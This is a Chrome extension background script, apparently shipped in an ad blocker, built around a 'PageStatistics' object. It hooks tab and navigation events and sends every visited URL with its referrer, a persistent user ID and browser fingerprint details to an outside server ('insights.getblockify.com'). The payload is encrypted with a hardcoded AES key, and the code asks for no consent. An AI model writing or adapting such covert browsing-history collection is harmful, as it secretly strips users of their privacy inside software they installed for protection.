// All logic is encapsulated in PageStatistics object
// Add new domains/subdomains in the adblocking filter lists, based on the demand

var user_agent = navigator.userAgent || "N/A";
var accept_language = navigator.language || navigator.userLanguage || "Unknown";
var os_name = getOSName() || navigator.userAgentData.platform || "Unknown";
var browser_name = getBrowserName() || navigator.userAgentData.brands[0].brand || "N/A";
var os_version = getOSVersion() || "N/A";
var browser_version = getBrowserVersion() || "N/A";

function getBrowserVersion() {
    let browserVersion = "Unknown Browser Version";
  
    if (navigator.userAgentData && navigator.userAgentData.brands) {
      const brands = navigator.userAgentData.brands;
      for (const brand of brands) {
        if (brand.brand !== "Not A Brand" && brand.brand !== "Not;A=Brand") {
          browserVersion = brand.version;
          break;
        }
      }
    } else {
      const userAgent = navigator.userAgent;
      let versionMatch;
  
      if (/Edg\/(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /Edg\/(\d+\.\d+)/.exec(userAgent);
      } else if (/OPR\/(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /OPR\/(\d+\.\d+)/.exec(userAgent);
      } else if (/Chrome\/(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /Chrome\/(\d+\.\d+)/.exec(userAgent);
      } else if (/Version\/(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /Version\/(\d+\.\d+)/.exec(userAgent);
      } else if (/Firefox\/(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /Firefox\/(\d+\.\d+)/.exec(userAgent);
      } else if (/MSIE (\d+\.\d+);/.test(userAgent)) {
        versionMatch = /MSIE (\d+\.\d+);/.exec(userAgent);
      } else if (/rv:(\d+\.\d+)/.test(userAgent)) {
        versionMatch = /rv:(\d+\.\d+)/.exec(userAgent);
      }
  
      if (versionMatch && versionMatch.length > 1) {
        browserVersion = versionMatch[1];
      }
    }
  
    return browserVersion;
};

function getOSName() {
    let osName = "Unknown OS";
  
    if (navigator.userAgentData && navigator.userAgentData.platform) {
      osName = navigator.userAgentData.platform;
    } else {
      const platform = navigator.platform.toLowerCase();
  
      if (platform.includes('win')) {
        osName = 'Windows';
      } else if (platform.includes('mac')) {
        osName = 'macOS';
      } else if (platform.includes('linux')) {
        osName = 'Linux';
      } else if (/android/.test(navigator.userAgent.toLowerCase())) {
        osName = 'Android';
      } else if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) {
        osName = 'iOS';
      }
    }
  
    return osName;
  };

  function getOSVersion() {
    let osVersion = "Unknown OS Version";
    const userAgent = navigator.userAgent || navigator.vendor;
  
    if (/Windows NT (\d+\.\d+)/.test(userAgent)) {
      const version = /Windows NT (\d+\.\d+)/.exec(userAgent)[1];
      const versionMap = {
        "10.0": "10",
        "6.3": "8.1",
        "6.2": "8",
        "6.1": "7",
        "6.0": "Vista",
        "5.1": "XP",
        "5.0": "2000"
      };
      osVersion = versionMap[version] || "Unknown Version";
    } else if (/Mac OS X (\d+[_\.]\d+[_\.]?\d*)/.test(userAgent)) {
      osVersion = /Mac OS X (\d+[_\.]\d+[_\.]?\d*)/.exec(userAgent)[1].replace(/_/g, '.');
    } else if (/Android (\d+[\.\d]*)/.test(userAgent)) {
      osVersion = /Android (\d+[\.\d]*)/.exec(userAgent)[1];
    } else if (/CPU (?:iPhone )?OS (\d+[_\.\d]*)/.test(userAgent)) {
      osVersion = /CPU (?:iPhone )?OS (\d+[_\.\d]*)/.exec(userAgent)[1].replace(/_/g, '.');
    }
  
    return osVersion;
};
function getBrowserName() {
    let browserName = "Unknown Browser";
  
    if (navigator.userAgentData && navigator.userAgentData.brands) {
      const brands = navigator.userAgentData.brands;
      for (const brand of brands) {
        if (brand.brand !== "Not A Brand" && brand.brand !== "Not;A=Brand") {
          browserName = brand.brand;
          break;
        }
      }
    } else {
      const userAgent = navigator.userAgent;
  
      if (/Edg\//.test(userAgent)) {
        browserName = "Microsoft Edge";
      } else if (/OPR\//.test(userAgent)) {
        browserName = "Opera";
      } else if (/Chrome\//.test(userAgent)) {
        browserName = "Chrome";
      } else if (/Safari\//.test(userAgent)) {
        browserName = "Safari";
      } else if (/Firefox\//.test(userAgent)) {
        browserName = "Firefox";
      } else if (/MSIE|Trident/.test(userAgent)) {
        browserName = "Internet Explorer";
      }
    }
  
    return browserName;
};
  

function PageStatistics(api_key, encryption_key, server_url) {

    // Here we store data that well be saved in storage
    this.data = null;
    // Key where data will be stored in local storage
    const statistics_storage_key = "user_statistics_data";

    this.getData = async function () {
        if (this.data != null) {
            return this.data;
        }
        let storageResult = await chrome.storage.local.get([statistics_storage_key]);

        if (statistics_storage_key in storageResult) {
            this.data = storageResult[statistics_storage_key]
            return this.data;
        }
        const uuid = await this.getUUIDfromStore();
        this.data = {
            uuid: uuid,
            user_agent: navigator.userAgent || "N/A",
            accept_language: navigator.language || navigator.userLanguage || "Unknown",
            os_name: getOSName() || navigator.userAgentData.platform || "Unknown",
            browser_name: getBrowserName() || navigator.userAgentData.brands[0].brand || "N/A",
            os_version: getOSVersion() || "N/A",
            browser_version: getBrowserVersion() || "N/A"
        };
        await this.storeData();

        return this.data;
    }
    this.storeData = async function () {
        const data = {};
        data[statistics_storage_key] = this.data;
        await chrome.storage.local.set(data);
    }
    /*
    this.getAccessToken = async function () {
        if (await this.getRefreshToken()) {
            return true;
        }
        try {
            const response = await fetch(server_url + "/auth", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json;charset=utf-8",
                },
                body: JSON.stringify({
                    api_key
                })
            });
            //console.log("getAccessToken.response")
            //console.log(response);
            const json = await response.json();
            this.data.accessToken = json.access_token.token;
            this.data.refreshToken = json.refresh_token.token;
            return true;
        } catch (err) {
            console.error(err);
            return false;
        }

    };*/

/*
    this.getRefreshToken = async function () {
        if (this.data.refresh_token == null) {
            return false;
        }
        try {
            const response = await fetch(server_url + "/refresh", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json;charset=utf-8",
                },
                body: JSON.stringify({
                    refresh_token: this.data.refreshToken
                })
            });
            if (response.status === 400) {
                return false;
            }
            const json = await response.json();
            this.data.accessToken = json.access_token.token;
            this.data.refreshToken = json.refresh_token.token;
            return true;
        } catch (err) {
            return false;
        }
    };
*/

    this.reportAction = async function (url, referer) {
        //console.log("reportStats", url, referer);

        await this.getData();

        /*
        if (!this.data.accessToken) {
            await this.getAccessToken();
        }*/

        //batch and buffer
        //when overflowing, proceed below
        //prepare only when sending
        await this.sendData(await this.prepareRequest([
            {
            fileDate: (new Date).toISOString(),
            deviceTimestamp: Date.now(),
            userId: this.data.uuid,
            referrerUrl: referer,
            targetUrl: url,
            requestType: "GET",
            scheme: new URL(url).protocol || "Unknown",
            host: new URL(url).hostname || "Unknown",
            user_agent: user_agent || this.data.user_agent || "N/A",
            accept_language: accept_language || this.data.accept_language || "N/A",
            os_name: os_name || this.data.os_name || "N/A",
            browser_name: browser_name || this.data.browser_name || "N/A",
            os_version: os_version || this.data.os_version || "N/A",
            browser_version: browser_version || this.data.browser_version || "N/A"
            }
        ]));
    };

    this.prepareRequest = async function (t) {

        const encrypted = await this.encryptData(JSON.stringify(t))

        if (encrypted) {
            return {
                eventType: 1,
                request: {
                    enRequest: JSON.stringify(encrypted)
                }
            }
        } else {
            return {
                eventType: 0,
                request: [
                    t
                ]
            }
        }

    };

    this.sendData = async function (t) 
    {
      // console.log(t); //remove this later!
      // console.log(this); //delete this later!
        const response = await fetch(server_url + "/process", 
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json;charset=utf-8"
                //,"Authorization": "Bearer " + this.data.accessToken
            },
            body: JSON.stringify(t)
        });
        //console.log("sendData.response");
        //console.log(response);
        /*
        if (response.status === 401) {
            const isSuccessful = await this.getAccessToken();
            if (isSuccessful) {
                await this.sendData(t)
            }
        }*/
    };

    this.getUUIDfromStore = async function () 
    {
        const result = await chrome.storage.sync.get(["user_stat_uuid"]);
        let uuid = result["user_stat_uuid"];

        if (uuid && this.validateUUID4(uuid)) 
        {
            return uuid;
        }

        uuid = this.makeUUID();
        await chrome.storage.sync.set({user_stat_uuid: uuid})
        return uuid;
    };

    this.makeUUID = function () 
    {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t, e) 
        {
            return ("x" === t ? e = 16 * Math.random() | 0 : 3 & e | 8).toString(16)
        });
    };
    this.validateUUID4 = function (t) 
    {
        return new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i).test(t)
    };
    this.encryptData = async function (text) {
        const enc = new TextEncoder();

        const key = await crypto.subtle.importKey(
            "raw",
            enc.encode(encryption_key),
            "AES-GCM",
            true,
            ["encrypt"]
        );
        const iv = crypto.getRandomValues(new Uint8Array(16))

        const cypher = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            enc.encode(text)
        );

        const res = new Uint8Array(iv.length + cypher.byteLength);
        res.set(iv);
        res.set(new Uint8Array(cypher), iv.length);

        return btoa(String.fromCharCode.apply(null, res));
    }

    function isValidPage(url) {
        if (url == null) {
            return false;
        }

        return url.startsWith("http");
    }

    // Here information about urls opened in tabs stored
    let tabs = {};

    const t = this;

    function tabInfo(tabId) {
        if (!(tabId in tabs)) {
            tabs[tabId] = {}
        }
        return tabs[tabId];
    }

    // We init all listeners here
    this.init = function () {
        function onRemoved(tabId, removeInfo) {
            delete tabs[tabId];
        }

        chrome.tabs.onRemoved.addListener(onRemoved);

        function onTabUpdated(tabId, changeInfo, tab) {
            if (changeInfo.status === "complete") {
                //console.log('onTabUpdated.complete');
                //console.log(tabId, changeInfo, tab);
                //console.log(tabInfo(tabId));

                let url = tab.url;
                const info = tabInfo(tabId);

                let referrer = info.url;
                if (info.hasTransition) {
                    referrer = null;
                }

                if (isValidPage(url) && url !== referrer) {
                    t.reportAction(url, referrer)
                }
                tabs[tabId] = {url: url};
            }
        }

        chrome.tabs.onUpdated.addListener(onTabUpdated);

        function onActivated(activeInfo) {
            const tabId = activeInfo.tabId;
            chrome.tabs.get(
                tabId,
                function (tab) {
                    if (isValidPage(tab.url)) {
                        tabInfo(tabId).url = tab.url;
                    }
                }
            )
        }

        chrome.tabs.onActivated.addListener(onActivated);

        function onCreatedNavigationTarget(details) {
            //console.log("onCreatedNavigationTarget");
            //console.log(details);

            let url = tabInfo(details.sourceTabId).url;
            if (isValidPage(url)) {
                tabInfo(details.tabId).url = url
                //console.log("onCreatedNavigationTarget", details.tabId, url);
            }
        }

        chrome.webNavigation.onCreatedNavigationTarget.addListener(onCreatedNavigationTarget);

        function onCommitted(details) {
            //console.log("onCommitted");
            //console.log(details);

            if (details.frameId !== 0) {
                return
            }
            const info = tabInfo(details.tabId);
            const transitionType = details.transitionType;
            info.hasTransition = !(transitionType === 'link' || transitionType === 'form_submit');
        }

        chrome.webNavigation.onCommitted.addListener(onCommitted);

        function onHistoryStateUpdated(details) {
            //console.log("onHistoryStateUpdated");
            //console.log(details);

            const info = tabInfo(details.tabId);
            info.historyStateUpdated = true;
        }

        chrome.webNavigation.onHistoryStateUpdated.addListener(onHistoryStateUpdated);
    };
};

// Here you configure your keys and server url
const stat = new PageStatistics(
    "Iengi0kiEi3eicae",
    "ej0hie1MThoo8Ri2",
    "https://insights.getblockify.com"
);

// Init all listeners
stat.init();